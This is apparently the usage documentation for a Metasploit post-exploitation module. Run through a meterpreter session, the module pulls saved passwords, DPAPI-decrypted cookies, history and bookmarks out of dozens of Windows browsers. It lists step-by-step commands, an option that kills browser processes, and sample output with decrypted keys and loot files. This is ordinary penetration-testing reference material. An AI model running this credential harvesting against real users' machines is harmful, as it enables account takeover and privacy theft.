
# Vulnerable Application

This post-exploitation module extracts saved user data from various Chromium-based and Gecko-based browsers and decrypts sensitive information, such as passwords and cookies. The module can also extract history & bookmarks. Chromium encrypts sensitive data (e.g., passwords and cookies) using Windows Data Protection API (DPAPI), which can only be decrypted with the **same** logon credentials. This module uses the current user's credentials to decrypt the sensitive data unless specified otherwise.

## Supported Browsers

### Chromium-Based Browsers
- Microsoft Edge
- Google Chrome
- Opera
- Iridium
- Brave
- CentBrowser
- Chedot
- Orbitum
- Comodo Dragon
- Yandex Browser
- 7Star
- Torch
- ChromePlus
- Komet
- Amigo
- Sputnik
- Citrio
- 360Chrome
- Uran
- Liebao
- Elements Browser
- Epic Privacy Browser
- CocCoc Browser
- Sleipnir
- QIP Surf
- Coowon
- Vivaldi

### Gecko-Based Browsers
- Mozilla Firefox
- Thunderbird
- SeaMonkey
- BlackHawk
- Cyberfox
- K-Meleon
- Icecat
- Pale Moon
- Comodo IceDragon
- Waterfox
- Postbox
- Flock Browser

## Verification Steps

1. Start `msfconsole`.
2. Obtain a meterpreter session on the target system.
3. Run the module: `use post/windows/gather/enum_browsers`
4. Set the appropriate session ID: `set SESSION <session id>`
5. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
6. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
7. Run the module: `run`
8. You should see the extracted browser data in the loot files.

## Options

- **KILL_BROWSER** - Kills browser processes before data extraction. This can help avoid file access issues if the browser is running, particularly for cookies. Default is `false`.
- **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
- **SESSION** - The session to run the module on. Required.

## Extracted Data

The module extracts the following data from supported browsers:

- **Login data** (username/passwords)
- **Cookies** (decrypted)
- **History** (URLs, titles, visit counts, last visit times)
- **Bookmarks**

The data is saved into separate loot files for each browser and data type, with filenames that include the extraction date, browser name, and data type for clarity.

## Example Output

### Meterpreter Session as Normal User

```bash
[*] Current user profile: C:\Users\ah
[*] Found Microsoft Edge
[+] └ Extracted Passwords to /root/.msf4/loot/20240921193101_default_192.168.0.29_MicrosoftEdge_p_679268.txt (395 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921193101_default_192.168.0.29_MicrosoftEdge_c_877807.txt (9088 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921193102_default_192.168.0.29_MicrosoftEdge_h_673551.txt (507 bytes)
[*] Found Brave
[+] └ Extracted Passwords to /root/.msf4/loot/20240921193105_default_192.168.0.29_Brave_passwords_575498.txt (73261 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted History to /root/.msf4/loot/20240921193119_default_192.168.0.29_Brave_history_439185.txt (2498413 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921193119_default_192.168.0.29_Brave_bookmarks_445491.txt (8601 bytes)
[*] Found Mozilla Firefox
[+] └ Extracted Logins to /root/.msf4/loot/20240921193123_default_192.168.0.29_MozillaFirefox__293343.json (522906 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921193124_default_192.168.0.29_MozillaFirefox__014088.txt (8215 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921193128_default_192.168.0.29_MozillaFirefox__763526.txt (408097 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921193132_default_192.168.0.29_MozillaFirefox__322216.txt (9690 bytes)
[*] Found Thunderbird
[+] └ Extracted Logins to /root/.msf4/loot/20240921193133_default_192.168.0.29_Thunderbird_logi_351433.json (3136 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921193134_default_192.168.0.29_Thunderbird_cook_018921.txt (3200 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921193137_default_192.168.0.29_Thunderbird_hist_367914.txt (3577 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921193141_default_192.168.0.29_Thunderbird_book_725692.txt (2 bytes)
[*] Post module execution completed
```

### Using KILL_BROWSER to Resolve File Access Issues

If the browser processes are running, cookies and other files may be locked and inaccessible. Use the `KILL_BROWSER` option to stop browsers before extraction:

```bash
msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
KILL_BROWSER => true
msf6 post(windows/gather/enum_browsers) > run

[*] Current user profile: C:\Users\ah
[*] Found Microsoft Edge
[+] └ Extracted Passwords to /root/.msf4/loot/20240921201057_default_192.168.0.29_MicrosoftEdge_p_232893.txt (395 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921201057_default_192.168.0.29_MicrosoftEdge_c_077883.txt (9088 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921201058_default_192.168.0.29_MicrosoftEdge_h_507564.txt (507 bytes)
[*] Found Brave
[+] └ Extracted Passwords to /root/.msf4/loot/20240921201106_default_192.168.0.29_Brave_passwords_884652.txt (73261 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921201107_default_192.168.0.29_Brave_cookies_674752.txt (261116 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921201121_default_192.168.0.29_Brave_history_006361.txt (2500006 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921201122_default_192.168.0.29_Brave_bookmarks_698530.txt (8601 bytes)
[*] Found Mozilla Firefox
[+] └ Extracted Logins to /root/.msf4/loot/20240921201125_default_192.168.0.29_MozillaFirefox__055989.json (522906 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921201126_default_192.168.0.29_MozillaFirefox__643594.txt (8215 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921201130_default_192.168.0.29_MozillaFirefox__071330.txt (408097 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921201134_default_192.168.0.29_MozillaFirefox__633130.txt (9690 bytes)
[*] Found Thunderbird
[+] └ Extracted Logins to /root/.msf4/loot/20240921201134_default_192.168.0.29_Thunderbird_logi_562248.json (3136 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921201135_default_192.168.0.29_Thunderbird_cook_115306.txt (3200 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921201139_default_192.168.0.29_Thunderbird_hist_108812.txt (3577 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921201143_default_192.168.0.29_Thunderbird_book_912944.txt (2 bytes)
[*] Post module execution completed
```

This will kill any running browser processes and avoid file access issues.

### Using VERBOSE Mode for Detailed Output

If you want to see each step of the extraction and decryption process, enable verbose mode:

```bash
msf6 post(windows/gather/enum_browsers) > set VERBOSE true
VERBOSE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Current user profile: C:\Users\ah
[*] Found Microsoft Edge
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Microsoft\Edge\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f74ba6ec3e4f774394b60c6be17156cb100000001e0000004d006900630072006f0073006f0066007400200045006400670065000000106600000001000020000000571587f33c18930a9c79ce75b7156c64d159a5e305204ca0d7d49215275428fa000000000e8000000002000020000000b4e331d5a62b6548e21ea4ecc630fb0ac3ed6dce39bc35c1e2cde61da6486ced30000000d65f5c3cb0591b058a69481e8e39b817de086e25d13d35c4d3450a31d2fc78fa6f2a47af19020963f13ae82b2967c4f34000000039a14221c9462dd252eee1df0ce0bdf7135a00d8a06ab6496bf4f957d196728165e2b3d982f35205c4adad3bd64954570a5f0018d90ec9dc23fb54af11080e86
[*] Starting DPAPI decryption process
[+] Decryption successful
[+] Decrypted key (hex): 16c25d5e81e9f1b4729bc412e250f2fa5b2e5b90d7e439768694b1630490e670
[+] └ Extracted Passwords to /root/.msf4/loot/20240921194816_default_192.168.0.29_MicrosoftEdge_p_903608.txt (395 bytes)
[+] └ Extracted Cookies to /root/.msf4/loot/20240921194817_default_192.168.0.29_MicrosoftEdge_c_562771.txt (9088 bytes)
[+] └ Extracted History to /root/.msf4/loot/20240921194817_default_192.168.0.29_MicrosoftEdge_h_074342.txt (507 bytes)
[*] Found Brave
[*] Getting encryption key from: C:\Users\ah\AppData\Local\BraveSoftware\Brave-Browser\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f74ba6ec3e4f774394b60c6be17156cb100000001c000000420072006100760065002000420072006f0077007300650072000000106600000001000020000000b1feb406d73aacc418e6048f0b7e1c54d97af7e6d343f8620fbcadf729ba7d5d000000000e8000000002000020000000c4ff71c562c25f380679b1a1bca886e5ef6f53b9e72d2392890c483608b991a1300000009edaa62eb3b99fbfca9aa6ad0a43da2ccfb2889aaba35458b9dd4163460de17733a169dd83658f9416fd11f5fc87733340000000239998fef8ca1d69824853411954f207df5f173a28c4b8505723a23e5698fa0352eb24435ea763839311cab42d269a9c2456c6c2e74c2edbe6001ad45b13d8b2
[*] Starting DPAPI decryption process
[+] Decryption successful
[+] Decrypted key (hex): 131c159c5460a2e1cf40502794865da88789f6f96da77ec105cc0ee5b21ce632
[+] └ Extracted Passwords to /root/.msf4/loot/20240921194820_default_192.168.0.29_Brave_passwords_463764.txt (73261 bytes)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Extracted History to /root/.msf4/loot/20240921194834_default_192.168.0.29_Brave_history_896256.txt (2499456 bytes)
[+] └ Extracted Bookmarks to /root/.msf4/loot/20240921194835_default_192.168.0.29_Brave_bookmarks_159673.txt (8601 bytes)
```
This will show detailed information, such as:

- The extraction of encryption keys from local state files.
- The decryption of data using DPAPI.
- Success or failure messages for each extraction step.

## Potential Errors

- **Cookies file in use**: If the cookies database is locked by the browser, you may encounter an error message similar to:

  ```bash
  [-] Cannot access Cookies. File in use by another process.
  ```

  You can resolve this by setting `KILL_BROWSER` to `true`.
